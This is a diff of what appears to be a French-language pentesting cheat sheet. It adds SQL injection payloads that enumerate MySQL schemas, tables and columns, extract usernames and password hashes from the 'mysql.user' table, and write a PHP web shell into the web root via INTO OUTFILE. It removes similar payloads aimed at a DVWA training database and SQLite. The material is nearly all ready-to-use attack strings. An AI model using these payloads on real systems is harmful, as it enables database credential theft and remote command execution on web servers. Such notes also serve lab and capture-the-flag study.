@@ -186,32 +186,18 @@ sh -f -NL 1234:localhost:5432 user@IP
 ' ORDER BY 2 --
 
 -- Liste des DB 
-' UNION SELECT schema_name FROM information_schema.schemata -- -
+' UNION SELECT group_concat(schema_name) FROM information_schema.schemata -- -
 -- Liste des tables d'une DB
-' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
+' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'mysql' -- -
 -- Explorer les colonnes
-' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa' -- -
+' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = 'user' AND table_schema = 'mysql' -- -
 -- Détails des colonnes d'une table
-' UNION SELECT group_concat(user) FROM dvwa.users -- -
+' UNION SELECT group_concat(user) FROM mysql.user -- -
+' UNION SELECT COUNT(*) FROM mysql.user -- -
+' UNION SELECT username FROM mysql.user LIMIT 1 OFFSET 0 -- -
+' UNION SELECT password FROM mysql.user LIMIT 1 OFFSET 1 -- -
 
-' UNION SELECT COUNT(*) FROM dvwa.users -- -
-' UNION SELECT username FROM dvwa.users LIMIT 1 OFFSET 0 -- -
-' UNION SELECT password FROM dvwa.users LIMIT 1 OFFSET 1 -- -
-
--- SQLITE
-' UNION SELECT sql FROM sqlite_master WHERE type='table' -- -
-' UNION SELECT name FROM sqlite_master WHERE type='table' -- -
-' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users' -- -
-' UNION SELECT username FROM users -- -
-' UNION SELECT password FROM users -- -
-
-' UNION SELECT COUNT(*) FROM users -- -
-' UNION SELECT username FROM users LIMIT 1 OFFSET 0 -- -
-' UNION SELECT password FROM users LIMIT 1 OFFSET 1 -- -
-
-
-
-Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 
 - Crack de hash / bruteforce password local
